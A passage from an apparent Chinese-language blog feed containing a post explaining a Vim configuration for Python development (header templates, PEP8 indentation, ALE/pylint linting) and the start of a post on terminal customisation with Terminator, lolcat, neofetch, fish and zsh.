fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5</span></span><br><span class="line"><span class="hljs-string">set enc=utf-8</span></span><br><span class="line"><span class="hljs-string">let &amp;termencoding=&amp;encoding</span></span><br><span class="line"><span class="hljs-string">set nu                        " 显示行数</span></span><br><span class="line"><span class="hljs-string">set nocompatible              " 必须，加载vim自带和插件相应的语法和文件类型相关脚本</span></span><br><span class="line"><span class="hljs-string">filetype off                  " 必须</span></span><br><span class="line"><span class="hljs-string">set list listchars=tab:&gt;-,trail:-,eol:$  "设定tab键显示为&gt;-,每行行尾显示$</span></span><br><span class="line"><span class="hljs-string">set report=0</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"python运行配置</span></span><br><span class="line"><span class="hljs-string">map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt;  "按F10键进行python调试</span></span><br><span class="line"><span class="hljs-string">au BufNewFile,BufRead *.py "设置py文件支持PEP8风格</span></span><br><span class="line"><span class="hljs-string">\ set tabstop=4r</span></span><br><span class="line"><span class="hljs-string">\ set softtabstop=4</span></span><br><span class="line"><span class="hljs-string">\ set shiftwidth=4</span></span><br><span class="line"><span class="hljs-string">\ set textwidth=79</span></span><br><span class="line"><span class="hljs-string">\ set expandtab</span></span><br><span class="line"><span class="hljs-string">\ set autoindent</span></span><br><span class="line"><span class="hljs-string">\ set fileformat=unix</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"auto add pyhton header --start 自动添加py文件头 </span></span><br><span class="line"><span class="hljs-string">autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader  </span></span><br><span class="line"><span class="hljs-string">autocmd BufNewFile *.py ks|call FileName()|'</span>s  </span><br><span class="line">autocmd BufNewFile *.py ks|call CreatedTime()|<span class="hljs-string">'s  </span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">fun FileName()  </span></span><br><span class="line"><span class="hljs-string">    if line("$") &gt; 10</span></span><br><span class="line"><span class="hljs-string">        let l = 10  "这里是字母L</span></span><br><span class="line"><span class="hljs-string">    else</span></span><br><span class="line"><span class="hljs-string">        let l =line("$")</span></span><br><span class="line"><span class="hljs-string">    endif</span></span><br><span class="line"><span class="hljs-string">    exe "1,".l."g/File Name:.*/s/File Name:.*/File Name:".expand("%")</span></span><br><span class="line"><span class="hljs-string">"最前面是数字1，这里的File Name:和模板中一致</span></span><br><span class="line"><span class="hljs-string">endfun</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">fun CreatedTime()</span></span><br><span class="line"><span class="hljs-string">    if line("$") &gt; 10</span></span><br><span class="line"><span class="hljs-string">        let l=10</span></span><br><span class="line"><span class="hljs-string">    else</span></span><br><span class="line"><span class="hljs-string">        let l=line("$")</span></span><br><span class="line"><span class="hljs-string">    endif</span></span><br><span class="line"><span class="hljs-string">    exe "1,".l."g/Created Time:.*/s/Created Time:.*/Created Time:".strftime("%Y-%m-%d %T")</span></span><br><span class="line"><span class="hljs-string">"这里Create Time:要和模板中一致</span></span><br><span class="line"><span class="hljs-string">endfun</span></span><br><span class="line"><span class="hljs-string">"auto add python header --end</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">Plugin '</span>w0rp/ale<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">" 对应语言需要安装相应的检查工具</span></span><br><span class="line"><span class="hljs-string">" https://github.com/w0rp/ale</span></span><br><span class="line"><span class="hljs-string">let g:ale_linters_explicit = 1 "除g:ale_linters指定，其他不可用</span></span><br><span class="line"><span class="hljs-string">let g:ale_linters = &#123;</span></span><br><span class="line"><span class="hljs-string">\'</span>python<span class="hljs-string">': ['</span>pylint<span class="hljs-string">']</span></span><br><span class="line"><span class="hljs-string">\&#125;</span></span><br><span class="line"><span class="hljs-string">"\   '</span>cpp<span class="hljs-string">': ['</span>cppcheck<span class="hljs-string">','</span>clang<span class="hljs-string">','</span>gcc<span class="hljs-string">'],</span></span><br><span class="line"><span class="hljs-string">"\   '</span>c<span class="hljs-string">': ['</span>cppcheck<span class="hljs-string">','</span>clang<span class="hljs-string">', '</span>gcc<span class="hljs-string">'],</span></span><br><span class="line"><span class="hljs-string">"\   '</span>bash<span class="hljs-string">': ['</span>shellcheck<span class="hljs-string">'],</span></span><br><span class="line"><span class="hljs-string">"\   '</span>go<span class="hljs-string">': ['</span>golint<span class="hljs-string">'],</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">let g:ale_sign_column_always = 1</span></span><br><span class="line"><span class="hljs-string">let g:ale_completion_delay = 500</span></span><br><span class="line"><span class="hljs-string">let g:ale_echo_delay = 20</span></span><br><span class="line"><span class="hljs-string">let g:ale_lint_delay = 500</span></span><br><span class="line"><span class="hljs-string">let g:ale_echo_msg_format = '</span>[%linter%] %code: %%s<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">let g:ale_lint_on_text_changed = '</span>normal<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">let g:ale_lint_on_insert_leave = 1</span></span><br><span class="line"><span class="hljs-string">let g:airline#extensions#ale#enabled = 1</span></span><br><span class="line"><span class="hljs-string">"let g:ale_set_quickfix = 1</span></span><br><span class="line"><span class="hljs-string">"let g:ale_open_list = 1"打开quitfix对话框</span></span><br><span class="line"><span class="hljs-string">let g:ale_c_gcc_options = '</span>-Wall -O2 -std=c99<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">let g:ale_cpp_gcc_options = '</span>-Wall -O2 -std=c++14<span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">let g:ale_c_cppcheck_options = '</span><span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">let g:ale_cpp_cppcheck_options = '</span><span class="hljs-string">'</span></span><br><span class="line"><span class="hljs-string">let g:ale_sign_error = "&gt;&gt;"</span></span><br><span class="line"><span class="hljs-string">let g:ale_sign_warning = "--"</span></span><br><span class="line"><span class="hljs-string">map &lt;F7&gt; ::ALEToggle&lt;CR&gt;</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">" 你的所有插件需要在下面这行之前</span></span><br><span class="line"><span class="hljs-string">call vundle#end()            " 必须</span></span><br><span class="line"><span class="hljs-string">filetype plugin indent on    " 必须，加载vim自带和插件相应的语法和文件类型相关脚本</span></span><br></pre></td></tr></table></figure><h4 id="配置解读"><a href="#配置解读" class="headerlink" title="配置解读"></a>配置解读</h4><h5 id="关于配色方案"><a href="#关于配色方案" class="headerlink" title="关于配色方案"></a>关于配色方案</h5><p>在我（或你）的<code>/usr/share/vim/vim80/colors/</code>目录，有着自带的一些配色方案，我选择的配色方案是 <font color="red"><code>desert</code></font> ，看下图；你还可以到网上找一些其他的配色方案来使用，前提是得将找来的配色方案文件放置在此目录下，请注意文件是 <font color="red"><code>.vim</code></font> 后缀。</p><p>如何设置配色方案？很简单，看上方配置文件的第 25 行（<font color="red">colorscheme desert</font>）。将 <font color="red"><code>desert</code></font> 替换为你喜欢的配色主题名，最后保存退出。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$  <span class="hljs-built_in">cd</span> /usr/share/vim/vim80/colors</span><br><span class="line">$  ls</span><br><span class="line">blue.vim      desert.vim    koehler.vim  peachpuff.vim  slate.vim</span><br><span class="line">darkblue.vim  elflord.vim   morning.vim  README.txt     torte.vim</span><br><span class="line">default.vim   evening.vim   murphy.vim   ron.vim        zellner.vim</span><br><span class="line">delek.vim     industry.vim  pablo.vim    shine.vim</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fy584vv8ybj30yj0py7wh.jpg" alt=""></p><h5 id="文件头部信息"><a href="#文件头部信息" class="headerlink" title="文件头部信息"></a>文件头部信息</h5><p>每次新建一个 <em>Python</em> 文件，会自动生成下图所示的头部信息。</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fy58ursaobg30vr0oldoh.gif" alt=""></p><p>这里得在 <code>~/.vim/</code> 目录下创建一个存放模板文件的目录，目录名就叫 <code>vimTemplate</code> ，模板名取为 <code>pythonHeader</code> </p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ~/.vim/vimTemplate &amp;&amp; vim pythonHeader</span><br></pre></td></tr></table></figure><p>将下面几行写入到模板文件 <code>pythonHeader</code> 之中</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment">#File Name:</span></span><br><span class="line"><span class="hljs-comment">#Created Time:</span></span><br></pre></td></tr></table></figure><p>生成头部的程序，也可看上方配置文件（从第 80 行开始往下看）</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"auto add pyhton header --start 自动添加py文件头 </span></span><br><span class="line"><span class="hljs-string">autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader  </span></span><br><span class="line"><span class="hljs-string">autocmd BufNewFile *.py ks|call FileName()|'s  </span></span><br><span class="line"><span class="hljs-string">autocmd BufNewFile *.py ks|call CreatedTime()|'s  </span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">fun FileName()  </span></span><br><span class="line"><span class="hljs-string">    if line("</span>$<span class="hljs-string">") &gt; 10</span></span><br><span class="line"><span class="hljs-string">        let l = 10  "</span>这里是字母L</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">        <span class="hljs-built_in">let</span> l =line(<span class="hljs-string">"$"</span>)</span><br><span class="line">    endif</span><br><span class="line">    exe <span class="hljs-string">"1,"</span>.l.<span class="hljs-string">"g/File Name:.*/s/File Name:.*/File Name:"</span>.expand(<span class="hljs-string">"%"</span>)</span><br><span class="line"><span class="hljs-string">"最前面是数字1，这里的File Name:和模板中一致</span></span><br><span class="line"><span class="hljs-string">endfun</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">fun CreatedTime()</span></span><br><span class="line"><span class="hljs-string">    if line("</span>$<span class="hljs-string">") &gt; 10</span></span><br><span class="line"><span class="hljs-string">        let l=10</span></span><br><span class="line"><span class="hljs-string">    else</span></span><br><span class="line"><span class="hljs-string">        let l=line("</span>$<span class="hljs-string">")</span></span><br><span class="line"><span class="hljs-string">    endif</span></span><br><span class="line"><span class="hljs-string">    exe "</span>1,<span class="hljs-string">".l."</span>g/Created Time:.*/s/Created Time:.*/Created Time:<span class="hljs-string">".strftime("</span>%Y-%m-%d %T<span class="hljs-string">")</span></span><br><span class="line"><span class="hljs-string">"</span>这里Create Time:要和模板中一致</span><br><span class="line">endfun</span><br><span class="line"><span class="hljs-string">"auto add python header --end</span></span><br></pre></td></tr></table></figure><h5 id="Python-运行及代码缩进"><a href="#Python-运行及代码缩进" class="headerlink" title="Python 运行及代码缩进"></a>Python 运行及代码缩进</h5><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"python运行配置</span></span><br><span class="line"><span class="hljs-string">map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt;  "</span>按F10键进行python调试</span><br><span class="line">au BufNewFile,BufRead *.py <span class="hljs-string">"设置py文件支持PEP8风格</span></span><br><span class="line"><span class="hljs-string">\ set tabstop=4r</span></span><br><span class="line"><span class="hljs-string">\ set softtabstop=4</span></span><br><span class="line"><span class="hljs-string">\ set shiftwidth=4</span></span><br><span class="line"><span class="hljs-string">\ set textwidth=79</span></span><br><span class="line"><span class="hljs-string">\ set expandtab</span></span><br><span class="line"><span class="hljs-string">\ set autoindent</span></span><br><span class="line"><span class="hljs-string">\ set fileformat=unix</span></span><br></pre></td></tr></table></figure><p>介于我的快捷键冲突，所以我将 <code>F10</code> 设置运行该 <em>Python</em> 文件（前提是得先保存）。</p><h5 id="代码语法检查"><a href="#代码语法检查" class="headerlink" title="代码语法检查"></a>代码语法检查</h5><p>前面安装的插件 <strong>ALE</strong> 以及 <strong>pylint</strong> ，现在可以对它们进行配置了。这里的缩进语法我已经配置好（仅限Python）。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Plugin <span class="hljs-string">'w0rp/ale'</span></span><br><span class="line"><span class="hljs-string">" 对应语言需要安装相应的检查工具</span></span><br><span class="line"><span class="hljs-string">"</span> https://github.com/w0rp/ale</span><br><span class="line"><span class="hljs-built_in">let</span> g:ale_linters_explicit = 1 <span class="hljs-string">"除g:ale_linters指定，其他不可用</span></span><br><span class="line"><span class="hljs-string">let g:ale_linters = &#123;</span></span><br><span class="line"><span class="hljs-string">\'python': ['pylint']</span></span><br><span class="line"><span class="hljs-string">\&#125;</span></span><br><span class="line"><span class="hljs-string">"</span>\   <span class="hljs-string">'cpp'</span>: [<span class="hljs-string">'cppcheck'</span>,<span class="hljs-string">'clang'</span>,<span class="hljs-string">'gcc'</span>],</span><br><span class="line"><span class="hljs-string">"\   'c': ['cppcheck','clang', 'gcc'],</span></span><br><span class="line"><span class="hljs-string">"</span>\   <span class="hljs-string">'bash'</span>: [<span class="hljs-string">'shellcheck'</span>],</span><br><span class="line"><span class="hljs-string">"\   'go': ['golint'],</span></span><br><span class="line"><span class="hljs-string">let g:ale_sign_column_always = 1</span></span><br><span class="line"><span class="hljs-string">let g:ale_completion_delay = 500</span></span><br><span class="line"><span class="hljs-string">let g:ale_echo_delay = 20</span></span><br><span class="line"><span class="hljs-string">let g:ale_lint_delay = 500</span></span><br><span class="line"><span class="hljs-string">let g:ale_echo_msg_format = '[%linter%] %code: %%s'</span></span><br><span class="line"><span class="hljs-string">let g:ale_lint_on_text_changed = 'normal'</span></span><br><span class="line"><span class="hljs-string">let g:ale_lint_on_insert_leave = 1</span></span><br><span class="line"><span class="hljs-string">let g:airline#extensions#ale#enabled = 1</span></span><br><span class="line"><span class="hljs-string">"</span><span class="hljs-built_in">let</span> g:ale_set_quickfix = 1</span><br><span class="line"><span class="hljs-string">"let g:ale_open_list = 1"</span>打开quitfix对话框</span><br><span class="line"><span class="hljs-built_in">let</span> g:ale_c_gcc_options = <span class="hljs-string">'-Wall -O2 -std=c99'</span></span><br><span class="line"><span class="hljs-built_in">let</span> g:ale_cpp_gcc_options = <span class="hljs-string">'-Wall -O2 -std=c++14'</span></span><br><span class="line"><span class="hljs-built_in">let</span> g:ale_c_cppcheck_options = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-built_in">let</span> g:ale_cpp_cppcheck_options = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-built_in">let</span> g:ale_sign_error = <span class="hljs-string">"&gt;&gt;"</span></span><br><span class="line"><span class="hljs-built_in">let</span> g:ale_sign_warning = <span class="hljs-string">"--"</span></span><br><span class="line">map &lt;F7&gt; ::ALEToggle&lt;CR&gt;  <span class="hljs-string">" 暂时关闭代码检查</span></span><br></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul><li>显示方面</li></ul><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"显示相关</span></span><br><span class="line"><span class="hljs-string">"</span><span class="hljs-built_in">set</span> shortmess=atI  <span class="hljs-string">"不显示帮助乌干达的提示</span></span><br><span class="line"><span class="hljs-string">colorscheme desert "</span>设置配色方案</span><br><span class="line"><span class="hljs-built_in">set</span> showcmd <span class="hljs-string">"输入的命令显示出来</span></span><br><span class="line"><span class="hljs-string">syntax on "</span>语法高亮</span><br><span class="line"><span class="hljs-built_in">set</span> tabstop=4  <span class="hljs-string">"Tab键的宽度设为４</span></span><br><span class="line"><span class="hljs-string">set softtabstop=4</span></span><br><span class="line"><span class="hljs-string">set shiftwidth=4  "</span>统一缩进为４</span><br><span class="line"><span class="hljs-built_in">set</span> autoindent  <span class="hljs-string">"开启自动缩进，保持缩进值与上一行相等</span></span><br><span class="line"><span class="hljs-string">autocmd InsertLeave * se nocul "</span>用浅色高亮当前行</span><br><span class="line">autocmd InsertEnter * se cul <span class="hljs-string">"用浅色高亮当前行</span></span><br><span class="line"><span class="hljs-string">set ruler "</span>显示当前光标行列位置</span><br><span class="line"><span class="hljs-built_in">set</span> mouse=a <span class="hljs-string">"支持鼠标</span></span><br><span class="line"><span class="hljs-string">set laststatus=2 "</span>显示状态栏（默认值为１，无法显示状态栏)</span><br><span class="line"><span class="hljs-keyword">if</span> has(<span class="hljs-string">'gui_running'</span>)</span><br><span class="line">    <span class="hljs-built_in">set</span> t_Co=256</span><br><span class="line">endif</span><br><span class="line"><span class="hljs-built_in">set</span> guifont=Mono</span><br><span class="line"><span class="hljs-built_in">set</span> autoread <span class="hljs-string">"当文件在外部修改时，vim自动更新载入</span></span><br><span class="line"><span class="hljs-string">set ignorecase "</span>搜索时忽略大小写</span><br><span class="line"><span class="hljs-built_in">set</span> foldmethod=syntax</span><br><span class="line"><span class="hljs-built_in">set</span> nofoldenable <span class="hljs-string">"此两行为折叠代码</span></span><br></pre></td></tr></table></figure><ul><li>保存、括号、行数……</li></ul><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"实现CTRL-w保存操作</span></span><br><span class="line"><span class="hljs-string">nnoremap &lt;C-w&gt; :w&lt;cr&gt;</span></span><br><span class="line"><span class="hljs-string">imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt;</span></span><br><span class="line"><span class="hljs-string">"</span>映射以F12打开NERDTree</span><br><span class="line">nnoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt;</span><br><span class="line"><span class="hljs-string">"映射自动补全括号</span></span><br><span class="line"><span class="hljs-string">inoremap ( ()&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">inoremap [ []&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">inoremap &#123; &#123;&#125;&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">inoremap "</span> <span class="hljs-string">""</span>&lt;ESC&gt;i</span><br><span class="line">inoremap <span class="hljs-string">' '</span><span class="hljs-string">'&lt;ESC&gt;i</span></span><br><span class="line"><span class="hljs-string">set encoding=utf-8</span></span><br><span class="line"><span class="hljs-string">set fenc=utf-8</span></span><br><span class="line"><span class="hljs-string">set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5</span></span><br><span class="line"><span class="hljs-string">set enc=utf-8</span></span><br><span class="line"><span class="hljs-string">let &amp;termencoding=&amp;encoding</span></span><br><span class="line"><span class="hljs-string">set nu                        " 显示行数</span></span><br><span class="line"><span class="hljs-string">set nocompatible              " 必须，加载vim自带和插件相应的语法和文件类型相关脚本</span></span><br><span class="line"><span class="hljs-string">filetype off                  " 必须</span></span><br><span class="line"><span class="hljs-string">set list listchars=tab:&gt;-,trail:-,eol:$  "设定tab键显示为&gt;-,每行行尾显示$</span></span><br><span class="line"><span class="hljs-string">set report=0</span></span><br></pre></td></tr></table></figure><p>…………</p><p>差不多就这些吧，这些也就仅仅入门/坑。以后有空再慢慢折腾吧！</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原本用着 Pycharm 好好的，可是它有点占用资源；每次在打开的过程中，CPU 直彪向 100% ，打开后稳定下来才恢复正常；也不知道这种情况是否属正常现象，网上的解决方案都无果。&lt;/p&gt;
&lt;p&gt;由此便有了此文……&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="不美化，怎开发" scheme="https://fanqxu.com/categories/%E4%B8%8D%E7%BE%8E%E5%8C%96%EF%BC%8C%E6%80%8E%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="python" scheme="https://fanqxu.com/tags/python/"/>
    
      <category term="vim" scheme="https://fanqxu.com/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>关于 Terminal 的一些骚姿势</title>
    <link href="https://fanqxu.com/2018/12/01/%E5%85%B3%E4%BA%8E-Terminal-%E7%9A%84%E4%B8%80%E4%BA%9B%E9%AA%9A%E6%93%8D%E4%BD%9C/index.html"/>
    <id>https://fanqxu.com/2018/12/01/关于-Terminal-的一些骚操作/index.html</id>
    <published>2018-12-01T05:09:20.000Z</published>
    <updated>2019-04-03T10:21:54.946Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>关于 Terminal 窗口、字体大小以及背景透明度，请自行选择合适方案。</p><p>关于那些除了装逼的 Terminal 特效，我就不提了。（譬如好莱坞😎）</p></blockquote><h3>写在前面</h3><h4 id="关于终端模拟器（Updated-by-2019-03-18）"><a href="#关于终端模拟器（Updated-by-2019-03-18）" class="headerlink" title="关于终端模拟器（Updated by 2019.03.18）"></a>关于终端模拟器（Updated by 2019.03.18）</h4><p>其实在图形化上使用的都不算是真真正正的终端，算终端模拟器。真正的终端其实是最小化安装系统的那个黑界面。</p><a id="more"></a><p>而 Ubuntu 上自带终端模拟器其实并不怎样，而在应用商店有一个 Terminator（终结者）还算不错。</p><p>可去 Ubuntu Software 点击下载，也可使用命令安装；</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> sudo apt install terminator</span></span><br></pre></td></tr></table></figure><h4>关于shell主题</h4><p>我使用的 <em>shell</em> 主题名为 <a href="https://github.com/EliverLara/Sweet" target="_blank" rel="noopener">Sweet</a> ，如下图所示</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5lbdklqj315o0vyjz2.jpg" alt=""></p><h4>关于字体</h4><p>另外，我使用的为一款优秀的开源字体 <a href="https://github.com/source-foundry/Hack" target="_blank" rel="noopener">Hack</a> ，如下图<br><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5lp2x90j31jk14sjs4.jpg" alt=""></p><p></p><h3>0x00 彩虹喵lolcat</h3><br>这玩意儿是一个将你在终端输入命令后，显示的文本颜色修改为彩虹色，还是比较漂亮的。<br>如你所愿，它被托管在 <strong>Github</strong> 。<br>仓库地址：<a href="https://github.com/busyloop/lolcat" target="_blank" rel="noopener">https://github.com/busyloop/lolcat</a><p></p><p></p><h4>安装</h4><br>首先，安装 <strong>git</strong> 和 <strong>gem</strong><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install git gem</span><br></pre></td></tr></table></figure><p></p><p>其次，克隆 <strong>lolcat</strong> 仓库<br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span> /opt &amp;&amp; sudo git <span class="hljs-built_in">clone</span> https://github.com/busyloop/lolcat.git</span><br></pre></td></tr></table></figure></p><p>最后使用 <strong>gem</strong> 安装 <strong>lolcat</strong><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span> /opt/lolcat/bin</span><br><span class="line">$ gem install lolcat</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5mhtcckj30s40m41kx.jpg" alt=""></p><p></p><h4>使用</h4><br>使用方法很简单，即在你要执行的命令后面加上它，譬如<br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/cpuinfo | lolcat</span><br></pre></td></tr></table></figure><p></p><p></p><h3>0x01 neofetch显示系统Info</h3><br>这条命令可以个性化地显示当前系统的一些信息，比较酷……<p></p><p></p><h4>安装</h4><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install neofetch</span><br></pre></td></tr></table></figure><p></p><p></p><h4>使用（附图）</h4><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ neofetch</span><br></pre></td></tr></table></figure><p></p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5mus4zwj30sh0kv1kx.jpg" alt=""></p><p></p><h3>0x02 fish外壳</h3><p></p><blockquote><p>一个友好、互动的命令行shell。</p><p>不可食用，但用着很舒服的一条鱼。<br>官网：<a href="http://fishshell.com/" target="_blank" rel="noopener">http://fishshell.com/</a><br>Github仓库：<a href="https://github.com/fish-shell/fish-shell" target="_blank" rel="noopener">https://github.com/fish-shell/fish-shell</a></p></blockquote><p></p><h4>安装</h4><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install fish</span><br></pre></td></tr></table></figure><p></p><p></p><h4>使用</h4><br>如果你是短期使用的话，则可以直接在终端输入命令<br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ fish</span><br></pre></td></tr></table></figure><p></p><p>如果你喜欢它，想长期，则应该右击你的终端窗口，选择 <font color="red"><code>配置文件首选项</code></font> （英文就是 <font color="red"><code>Preferences</code></font> ）。然后在上方栏选择 <font color="red"><code>命令</code></font> 或者 <font color="red"><code>Command</code></font> ，勾上第二行，并在其下方输入 <font color="red"><code>/usr/bin/fish</code></font> 。如下图所示：<br><img src="http://ww1.sinaimg.cn/large/006V665tgy1fxr5nuf82ij30nb0k7jsj.jpg" alt=""></p><p></p><h3>0x03 oh-my-zsh美化</h3><p></p><blockquote><p>说起 <em>oh-my-zsh</em> ，必须得提 <em>zsh</em> ，和上面的 <em>fish</em> 以及系统默认的 <em>bash</em> ，均属同一类型。<br>也就是说，这三者只能选其一。而我选择的就是 <strong>zsh</strong> ，搭配 <strong>oh-my-zsh</strong> 美化。<br>官网：<a href="https://ohmyz.sh/" target="_blank" rel="noopener">https://ohmyz.sh/</a><br>Github仓库：<a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener">https://github.com/robbyrussell/oh-my-zsh</a></p></blockquote><p></p><h4>快速开始</h4><br>此前得预先安装 <em>zsh</em><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install zsh</span><br></pre></td></tr></table></figure><p></p><p>然后安装 <em>wget</em> 或者 <em>curl</em> ，以及必须的 <em>git</em><br><figure class="highlight zsh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install wget curl git</span><br></pre></td></tr></table></figure></p><p></p><h4>安装</h4><br>最后使用 <em>wget</em> 或者 <em>curl</em> 来安装 <em>oh-my-zsh</em> （两者二选一）<br><figure class="highlight zsh hljs"><table><tr><td 